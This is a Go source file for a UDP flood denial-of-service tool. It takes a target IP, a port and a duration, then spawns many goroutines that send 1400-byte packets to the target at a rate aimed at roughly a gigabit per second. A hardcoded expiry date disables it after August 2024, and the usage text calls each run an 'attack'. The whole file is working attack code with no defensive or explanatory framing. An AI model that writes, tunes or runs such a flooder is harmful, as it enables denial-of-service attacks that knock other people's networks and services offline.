package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func main() {
	// Check for expiration date
	expirationDate := time.Date(2024, time.August, 8, 0, 0, 0, 0, time.UTC)
	if time.Now().After(expirationDate) {
		fmt.Println("This script has expired and cannot be run.")
		return
	}

	if len(os.Args) != 4 {
		fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration > 600 {
		fmt.Println("Invalid attack duration: must be an integer up to 600 seconds.")
		return
	}

	packetSize := 1400 // Adjust packet size as needed
	packetsPerSecond := 1_000_000_000 / packetSize
	numThreads := packetsPerSecond / 23_000

	var wg sync.WaitGroup

	// Setup a timer to end the attack after the specified duration
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendUDPPackets(targetIP, targetPort, packetsPerSecond/numThreads, endTime)
		}()
	}
	wg.Wait()

	fmt.Println("Attack finished.")
}

func sendUDPPackets(ip, port string, packetsPerSecond int, endTime time.Time) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	packet := make([]byte, 1400) // Adjust packet size as needed

	ticker := time.NewTicker(time.Second / time.Duration(packetsPerSecond))
	defer ticker.Stop()

	for time.Now().Before(endTime) {
		select {
		case <-ticker.C:
			_, err := conn.Write(packet)
			if err != nil {
				fmt.Println("Error sending UDP packet:", err)
				return
			}
		}
	}
}
